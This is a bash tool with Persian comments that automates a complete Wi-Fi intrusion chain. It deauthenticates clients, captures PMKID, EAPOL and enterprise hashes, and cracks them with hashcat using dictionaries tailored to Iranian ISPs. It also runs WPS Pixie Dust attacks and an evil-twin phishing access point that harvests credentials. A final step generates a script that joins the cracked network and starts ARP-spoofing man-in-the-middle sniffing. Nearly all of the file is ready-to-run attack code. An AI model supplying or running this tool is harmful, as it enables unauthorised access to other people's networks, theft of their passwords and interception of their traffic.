#!/usr/bin/env bash
# ==========================================================================
#  autopwn-ng — زنجیره کامل تست نفوذ وای‌فای
#  استفاده: sudo autopwn-ng [-p profile] [-t seconds] [-i iface] [-w wordlist]
#           [-d dictdir] [--no-wps] [--no-twin] [--no-post] [--target BSSID]
#  پروفایل: stealth | normal | brute
# ==========================================================================
set -uo pipefail
export LC_ALL=C

PROFILE=normal
CAPTURE=120
IFACE=""
IFACE2=""
DICTDIR="/opt/wordlists"
WORDLIST=""
DO_WPS=1
DO_TWIN=1
DO_POST=1
TARGET=""
WORK="$(mktemp -d /tmp/autopwn.XXXXXX)"
POT="$WORK/hashcat.pot"
HASH="$WORK/targets.hc22000"
CAP="$WORK/capture.pcapng"
REPORT="$WORK/report"
mkdir -p "$REPORT"

c(){ printf '\033[1;36m[*]\033[0m %s\n' "$*"; }
ok(){ printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
warn(){ printf '\033[1;33m[!]\033[0m %s\n' "$*"; }
err(){ printf '\033[1;31m[-]\033[0m %s\n' "$*"; }
hr(){ printf '\033[1;35m%s\033[0m\n' "────────────────────────────────────────────"; }

while [ $# -gt 0 ]; do
  case "$1" in
    -p) PROFILE="$2"; shift 2;;
    -t) CAPTURE="$2"; shift 2;;
    -i) IFACE="$2"; shift 2;;
    -I) IFACE2="$2"; shift 2;;
    -w) WORDLIST="$2"; shift 2;;
    -d) DICTDIR="$2"; shift 2;;
    --target) TARGET="$2"; shift 2;;
    --no-wps) DO_WPS=0; shift;;
    --no-twin) DO_TWIN=0; shift;;
    --no-post) DO_POST=0; shift;;
    -h|--help) sed -n '2,8p' "$0"; exit 0;;
    *) err "گزینه ناشناس: $1"; exit 1;;
  esac
done

case "$PROFILE" in
  stealth) CAPTURE=${CAPTURE:-240}; WLIMIT=1;;
  brute)   CAPTURE=${CAPTURE:-420}; WLIMIT=3;;
  *)       CAPTURE=$CAPTURE; WLIMIT=3;;
esac

[ "$(id -u)" -eq 0 ] || { err "با sudo اجرا کن."; exit 1; }
command -v hashcat >/dev/null && command -v hcxdumptool >/dev/null && command -v iw >/dev/null \
  || { err "پیش‌نیازها نصب نیستند. بخش نصب را اجرا کن."; exit 1; }
command -v mdk4 >/dev/null || warn "mdk4 نصب نیست؛ دِاوث ضعیف‌تر می‌شود."

# ---------- پاکسازی ----------
cleanup(){
  [ -n "${HK_PID:-}" ] && kill "$HK_PID" 2>/dev/null
  [ -n "${MDK_PID:-}" ] && kill "$MDK_PID" 2>/dev/null
  [ -n "${TWIN_PID:-}" ] && kill "$TWIN_PID" 2>/dev/null
  [ -n "${MON:-}" ] && airmon-ng stop "$MON" >/dev/null 2>&1
  for i in "$IFACE" "$IFACE2"; do [ -n "$i" ] && ip link set "$i" up 2>/dev/null; done
  systemctl restart NetworkManager >/dev/null 2>&1 || true
  hr; c "خروجی‌ها: $WORK"
}
trap cleanup EXIT INT TERM

# ---------- فاز ۰: آماده‌سازی ----------
hr; c "فاز ۰ — آماده‌سازی"
if [ -z "$IFACE" ]; then IFACE=$(iw dev | awk '/Interface/{print $2; exit}'); fi
[ -n "$IFACE" ] || { err "دانگل وای‌فای پیدا نشد."; exit 1; }

if [ -z "$IFACE2" ]; then
  IFACE2=$(iw dev | awk '/Interface/{print $2}' | grep -vxF "$IFACE" | head -1)
fi
[ -n "$IFACE2" ] && ok "دانگل دوم برای evil twin: $IFACE2" || { warn "دانگل دوم نیست؛ twin غیرفعال."; DO_TWIN=0; }

c "تشخیص GPU / بنچمارک hashcat..."
hashcat -I > "$WORK/hashcat-info.txt" 2>&1
if grep -qiE 'Type\.+: (GPU|CUDA|HIP)' "$WORK/hashcat-info.txt"; then
  ok "GPU شناسایی شد."; HW=3
elif grep -qi 'OpenCL' "$WORK/hashcat-info.txt"; then
  warn "فقط CPU/OpenCL؛ کند خواهد بود."; HW=1
else
  err "hashcat هیچ بک‌اندی ندارد. درایور OpenCL نصب کن."; HW=1
fi

airmon-ng check kill >/dev/null 2>&1
BEFORE=$(iw dev | awk '/Interface/{print $2}')
airmon-ng start "$IFACE" >/dev/null 2>&1
AFTER=$(iw dev | awk '/Interface/{print $2}')
MON=$(comm -13 <(sort <<<"$BEFORE") <(sort <<<"$AFTER") | head -1)
[ -z "$MON" ] && MON="$IFACE"
iw dev "$MON" info 2>/dev/null | grep -q monitor || {
  ip link set "$MON" down; iw dev "$MON" set type monitor; ip link set "$MON" up; }
iw dev "$MON" info 2>/dev/null | grep -q monitor || { err "مانیتور مود نشد."; exit 1; }
ok "مانیتور مود: $MON"

# MAC رندوم برای مخفی‌کاری در حالت stealth
if [ "$PROFILE" = stealth ]; then
  ip link set "$MON" down
  macchanger -r "$MON" >/dev/null 2>&1 || true
  ip link set "$MON" up
  ok "MAC رندوم شد."
fi

# ---------- فاز ۱: برداشت ----------
hr; c "فاز ۱ — برداشت PMKID + EAPOL + EAP برای ${CAPTURE} ثانیه"
HDR=$(hcxdumptool --help 2>&1 || true)
if grep -q -- '--filterlist_ap' <<<"$HDR"; then
  if grep -qE '^\s*-w[, ]' <<<"$HDR"; then OUTFLAG=-w; else OUTFLAG=-o; fi
  FILTER=()
  [ -n "$TARGET" ] && FILTER=(--filterlist_ap="$TARGET" --filtermode=2)
  hcxdumptool -i "$MON" "$OUTFLAG" "$CAP" "${FILTER[@]}" > "$WORK/hcdump.log" 2>&1 &
  HK_PID=$!
else
  err "نسخه hcxdumptool ناشناخته."; exit 1
fi

# دِاوث دوره‌ای با mdk4 برای اجبار به reassociation
if command -v mdk4 >/dev/null; then
  ( sleep 5; mdk4 "$MON" d -b "$WORK/blacklist" >/dev/null 2>&1 ) &
  MDK_PID=$!
fi

# اسکن موازی برای شناسایی Enterprise و WPS
airodump-ng --band abg --output-format csv -w "$WORK/scan" "$MON" >/dev/null 2>&1 &
SCAN_PID=$!

sleep "$CAPTURE"
kill "$HK_PID" 2>/dev/null; wait "$HK_PID" 2>/dev/null; HK_PID=""
kill "$SCAN_PID" 2>/dev/null; wait "$SCAN_PID" 2>/dev/null
kill "$MDK_PID" 2>/dev/null; MDK_PID=""

[ -s "$CAP" ] && ok "برداشت: $(du -h "$CAP" | cut -f1)" || { err "هیچ داده‌ای گرفته نشد."; exit 1; }

# ---------- فاز ۲: نرمال‌سازی ----------
hr; c "فاز ۲ — استخراج و حذف تکراری"
hcxpcapngtool -o "$WORK/raw.hc22000" -E "$WORK/essids.txt" \
  --eapmschapv2="$WORK/mschapv2.txt" "$CAP" > "$WORK/hcxtool.log" 2>&1

hcxhashtool -i "$WORK/raw.hc22000" -o "$HASH" --essid-group >/dev/null 2>&1 \
  || cp "$WORK/raw.hc22000" "$HASH" 2>/dev/null
[ -s "$HASH" ] || { warn "هیچ هش WPA‌ای نبود."; : > "$HASH"; }

PMKID_N=$(grep -c '^\*\*\*\*' "$HASH" 2>/dev/null || echo 0)
EAPOL_N=$(grep -c 'WPA\*02' "$HASH" 2>/dev/null || echo 0)
EAP_N=$(wc -l < "$WORK/mschapv2.txt" 2>/dev/null || echo 0)
ok "PMKID: $PMKID_N | EAPOL: $EAPOL_N | Enterprise: $EAP_N"

# ---------- فاز ۳: موتور کرک ----------
hr; c "فاز ۳ — موتور کرک مرحله‌ای"

build_dicts(){
  D="$WORK/dicts"; mkdir -p "$D"
  # پیش‌فرض‌های وندور بر اساس SSID
  : > "$D/vendor.txt"
  if [ -s "$WORK/essids.txt" ]; then
    while IFS= read -r e; do
      [ -z "$e" ] && continue
      printf '%s\n%s\n%s\n%s\n%s\n%s\n' "$e" "$e"123 "$e"1234 "${e,,}" "${e^^}" "${e//[^A-Za-z0-9]/}" >> "$D/vendor.txt"
      # پسوندهای رایج ISP ایران
      for s in 1234 12345 123456 12345678 1111 0000 1 12 123 1375 1380 1390 1400; do
        printf '%s%s\n' "$e" "$s" >> "$D/vendor.txt"
      done
      # پیشوندهای اپراتور
      case "$e" in
        *Mobi*|*mobi*|*Irancell*|*irancell*|*IRANCELL*)
          for s in 1234 12345 123456 11111111 00000000; do printf '%s\n' "$s" >> "$D/vendor.txt"; done;;
        *TD-*|*td-*|*ZTE*|*zte*|*D-Link*|*Dlink*|*TP-Link*|*tplink*)
          printf 'admin\npassword\n12345678\n1234567890\n' >> "$D/vendor.txt";;
      esac
    done < "$WORK/essids.txt"
  fi
  sort -u "$D/vendor.txt" -o "$D/vendor.txt"
}

cracked_count(){ hashcat -m 22000 "$HASH" --show --potfile-path "$POT" 2>/dev/null | wc -l; }
total_count(){ wc -l < "$HASH" 2>/dev/null || echo 0; }

run_hc(){
  local label="$1"; shift
  [ -s "$HASH" ] || return 0
  local tot cr; tot=$(total_count); cr=$(cracked_count)
  [ "$cr" -ge "$tot" ] && return 0
  c "  → $label  ($cr/$tot)"
  timeout 900 hashcat -m 22000 --potfile-path "$POT" -w "$WLIMIT" -O --force \
    --status --status-timer=30 "$HASH" "$@" >> "$WORK/hc.log" 2>&1
}

build_dicts
RULES=/usr/share/hashcat/rules
WORDLISTS=()
[ -n "$WORDLIST" ] && [ -f "$WORDLIST" ] && WORDLISTS+=("$WORDLIST")
for f in "$DICTDIR"/rockyou.txt "$DICTDIR"/weakpass*.txt "$DICTDIR"/hashmob*.txt \
         /usr/share/wordlists/rockyou.txt; do
  [ -f "$f" ] && WORDLISTS+=("$f")
done
[ ${#WORDLISTS[@]} -eq 0 ] && { warn "هیچ وردلیستی نبود؛ فقط ماسک اجرا می‌شود."; WORDLISTS=("$WORK/dicts/vendor.txt"); }

# لایه ۱: دیکشنری مشتق از SSID + پیش‌فرض وندور
run_hc "دیکشنری SSID/وندور" -a 0 "$WORK/dicts/vendor.txt"

# لایه ۲: rockyou بدون rule
run_hc "rockyou خام" -a 0 "${WORDLISTS[0]}"

# لایه ۳: rockyou + best64
[ -f "$RULES/best64.rule" ] && run_hc "rockyou + best64" -a 0 "${WORDLISTS[0]}" -r "$RULES/best64.rule"

# لایه ۴: ماسک‌های عددی رایج (۸ و ۱۰ رقم)
run_hc "ماسک ۸ رقمی" -a 3 '?d?d?d?d?d?d?d?d'
run_hc "ماسک ۱۰ رقمی" -a 3 '?d?d?d?d?d?d?d?d?d?d'
run_hc "موبایل ایرانی" -a 3 '09?d?d?d?d?d?d?d?d?d'

# لایه ۵: هیبرید دیکشنری + ۴ رقم
[ -s "$WORK/dicts/vendor.txt" ] && run_hc "هیبرید SSID + ۴ رقم" -a 6 "$WORK/dicts/vendor.txt" '?d?d?d?d'

# لایه ۶: weakpass / hashmob با rule
for w in "${WORDLISTS[@]:1}"; do
  [ -f "$w" ] || continue
  [ -f "$RULES/dive.rule" ] && run_hc "$(basename "$w") + dive" -a 0 "$w" -r "$RULES/dive.rule" \
    || run_hc "$(basename "$w") خام" -a 0 "$w"
done

# لایه ۷: keyboard walk
if command -v kwp >/dev/null && [ -s "$WORK/essids.txt" ]; then
  kwp -z "$DICTDIR/keyboard-base.txt" -r "$DICTDIR/keyboard-rules.txt" --hwlayout en-US 2>/dev/null \
    | head -5000000 > "$WORK/dicts/kw.txt"
  [ -s "$WORK/dicts/kw.txt" ] && run_hc "keyboard walk" -a 0 "$WORK/dicts/kw.txt"
fi

# لایه ۸: Enterprise MSCHAPv2
if [ -s "$WORK/mschapv2.txt" ]; then
  hr; c "فاز ۳ب — کرک Enterprise (MSCHAPv2)"
  timeout 600 hashcat -m 5500 --potfile-path "$POT" -w "$WLIMIT" --force "$WORK/mschapv2.txt" \
    "${WORDLISTS[0]}" >> "$WORK/hc.log" 2>&1
  hashcat -m 5500 "$WORK/mschapv2.txt" --show --potfile-path "$POT" 2>/dev/null \
    >> "$WORK/enterprise-cracked.txt"
fi

# ---------- فاز ۴: WPS Pixie Dust ----------
if [ "$DO_WPS" -eq 1 ] && command -v reaver >/dev/null && [ -f "$WORK/scan-01.csv" ]; then
  hr; c "فاز ۴ — WPS Pixie Dust"
  awk -F',' 'NR>1 && $1 ~ /^[0-9A-Fa-f:]{17}$/ {x=$1;gsub(/ /,"",x); c=$4; gsub(/ /,"",c); print x, c}' \
    "$WORK/scan-01.csv" | sort -u > "$WORK/wps-cands.txt"
  while read -r b ch; do
    grep -q "$b" "$WORK/cracked.txt" 2>/dev/null && continue
    [ -z "$ch" ] && continue
    c "  → reaver -K 1 روی $b"
    timeout 240 reaver -i "$MON" -b "$b" -c "$ch" -K 1 -N -vv -d 5 > "$WORK/wps-$b.txt" 2>&1
    k=$(grep -oP "WPA PSK:\s*'\K[^']+" "$WORK/wps-$b.txt" | head -1)
    [ -n "$k" ] && ok "WPS → $k" && echo "$b|$k|WPS" >> "$WORK/cracked.txt"
  done < "$WORK/wps-cands.txt"
fi

# ---------- گزارش کرک ----------
hr; c "استخراج نتایج"
hashcat -m 22000 "$HASH" --show --potfile-path "$POT" 2>/dev/null > "$WORK/cracked-raw.txt"
: > "$WORK/cracked.txt"
while IFS= read -r line; do
  [ -z "$line" ] && continue
  h="${line%%:*}"; pw="${line#*:}"
  bssid=$(awk -F'*' '{print $4}' <<<"$h")
  essid=$(awk -F'*' '{print $6}' <<<"$h" | xxd -r -p 2>/dev/null)
  [ -z "$essid" ] && essid="(نامشخص)"
  echo "$bssid|$pw|$essid" >> "$WORK/cracked.txt"
done < "$WORK/cracked-raw.txt"
[ -s "$WORK/enterprise-cracked.txt" ] && sed 's/^/ENTERPRISE|/' "$WORK/enterprise-cracked.txt" >> "$WORK/cracked.txt"

# ---------- فاز ۵: Evil Twin ----------
if [ "$DO_TWIN" -eq 1 ] && [ -n "$IFACE2" ] && ! [ -s "$WORK/cracked.txt" ]; then
  hr; c "فاز ۵ — Evil Twin + captive portal"
  if command -v hostapd-mana >/dev/null; then
    TGT="${TARGET:-$(awk -F',' 'NR>1 && $1 ~ /^[0-9A-Fa-f:]{17}$/ {x=$1;gsub(/ /,"",x);print x; exit}' "$WORK/scan-01.csv")}"
    ESS=$(awk -F',' -v b="$TGT" 'NR>1 {x=$1;gsub(/ /,"",x); if(x==b){e=$14;gsub(/^ +| +$/,"",e);print e;exit}}' "$WORK/scan-01.csv")
    if [ -n "$TGT" ] && [ -n "$ESS" ]; then
      cat > "$WORK/mana.conf" <<EOF
interface=$IFACE2
driver=nl80211
ssid=$ESS
channel=6
hw_mode=g
mana_wpe=1
mana_credout=$WORK/creds.txt
mana_eapsuccess=1
mana_macacl=0
EOF
      hostapd-mana "$WORK/mana.conf" > "$WORK/mana.log" 2>&1 &
      TWIN_PID=$!
      ok "AP قلابی «$ESS» روی $IFACE2 بالا آمد. منتظر قربانی..."
      sleep 180
      kill "$TWIN_PID" 2>/dev/null; TWIN_PID=""
      [ -s "$WORK/creds.txt" ] && ok "اعتبارنامه از twin:" && cat "$WORK/creds.txt" \
        && sed 's/^/TWIN|/' "$WORK/creds.txt" >> "$WORK/cracked.txt"
    fi
  elif command -v wifiphisher >/dev/null; then
    wifiphisher -aI "$IFACE2" -eI "$MON" -p firmware-upgrade --noextensions
  else
    warn "hostapd-mana یا wifiphisher نصب نیست."
  fi
fi

# ---------- فاز ۶: Post-exploit ----------
if [ "$DO_POST" -eq 1 ] && [ -s "$WORK/cracked.txt" ]; then
  hr; c "فاز ۶ — آماده‌سازی post-exploit"
  first=$(head -1 "$WORK/cracked.txt")
  b=$(cut -d'|' -f1 <<<"$first"); p=$(cut -d'|' -f2 <<<"$first")
  cat > "$REPORT/connect.sh" <<EOF
#!/usr/bin/env bash
# اتصال به شبکه کرک‌شده و شروع MITM
nmcli dev wifi connect "$b" password '$p'
sleep 5
sudo bettercap -iface "$IFACE" -eval 'set arp.spoof.fullduplex true; arp.spoof on; net.sniff on'
EOF
  chmod +x "$REPORT/connect.sh"
  ok "اسکریپت اتصال + bettercap: $REPORT/connect.sh"
fi

# ---------- گزارش ----------
hr
{
  echo "# گزارش autopwn-ng"
  echo "تاریخ: $(date -Is)"
  echo "پروفایل: $PROFILE | مدت برداشت: ${CAPTURE}s | مونیتور: $MON"
  echo
  echo "## هش‌ها"
  echo "- PMKID: $PMKID_N"
  echo "- EAPOL: $EAPOL_N"
  echo "- Enterprise: $EAP_N"
  echo
  echo "## نتایج"
  if [ -s "$WORK/cracked.txt" ]; then
    while IFS='|' read -r a b2 c2; do
      echo "- **SSID:** $c2  \`BSSID: $a\`  →  **پسورد:** \`$b2\`"
    done < "$WORK/cracked.txt"
  else
    echo "- هیچ پسوردی بازیابی نشد."
  fi
} > "$REPORT/summary.md"

jq -R -s 'split("\n") | map(select(length>0)) | map(split("|")) |
  map({bssid: .[0], password: .[1], essid: .[2], source: (.[3] // "crack")})' \
  "$WORK/cracked.txt" > "$REPORT/summary.json" 2>/dev/null

echo
if [ -s "$WORK/cracked.txt" ]; then
  ok "═══ نتایج ═══"
  awk -F'|' '{printf "  SSID: %-28s  پسورد: %s\n", $3, $2}' "$WORK/cracked.txt"
  c "گزارش: $REPORT/summary.md"
else
  warn "کرک نشد. وردلیست بزرگ‌تر یا hashcat با GPU قوی‌تر لازم است."
fi
